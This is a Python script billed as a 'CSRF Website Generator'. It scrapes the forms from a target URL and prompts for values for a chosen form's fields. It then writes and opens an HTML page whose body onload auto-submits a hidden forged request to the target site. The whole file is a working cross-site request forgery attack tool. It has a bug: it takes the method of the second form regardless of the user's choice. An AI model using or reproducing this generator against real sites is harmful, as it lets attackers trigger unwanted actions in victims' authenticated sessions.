from bs4 import BeautifulSoup
import requests
import argparse
import webbrowser
import os

def website(url, m, d):
    with open("index.html", "w") as site:
        p = """
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body onload=document.getElementById('xsrf').submit()>
        <form id='xsrf' action=\"{}\" method=\"{}\">
            """.format(url, m.lower())
        for key, value in d.items():
            p += """
        <input type='hidden' name='{}' value='{}'>
        </input>
            """.format(key, value)
        p += """
        </form>
    </body>
</html>
        """
        site.write(p)
    new = 2
    webbrowser.open('file://' + os.path.realpath('index.html'), new=new)    

def prettyPrint(forms, url):
    for form in forms:
        try:
            print("form action: {}, {}".format(form['action'], form['method']))
            inputs = form.find_all('input')
            for enter in inputs:
                print(" -> {}".format(enter.attrs))
        except KeyError:
            print("form action: {}, {}".format(url, form['method']))
            inputs = form.find_all('input')
            for enter in inputs:
                print(" -> {}".format(enter.attrs))

def creation(forms):
    print("\nWhich one do you want to make a site with? (answer numerically starting from 0)")
    ans = int(input())
    items = forms[ans].find_all('input')
    dic = {}
    for i in items:
        try:
            print("We have found paramater: {}".format(i.attrs['name']), "\nWhat value do you want to give it?")
            value = input()
            dic[i.attrs['name']] = value
        except KeyError:
            pass
    return dic

def main():
    parser = argparse.ArgumentParser(description='The (to-be) Definitive CSRF Website Generator', epilog='Hack The Planet!')
    parser.add_argument('Url', metavar='url', help='The url of the website you are testing', type=str)
    #parser.add_argument('-m', '--method', help='The specific type of method you want to test(GET, PUSH, ...)', type=str) Doesn't do anything for now, included it for later. 
    args = parser.parse_args()

    url = args.Url
    page = requests.get(url)
    soup = BeautifulSoup(page.content, "html.parser")
    forms = soup.find_all('form')

    prettyPrint(forms, url)
    dictionary = creation(forms)
    website(url, forms[1]['method'], dictionary)

main()
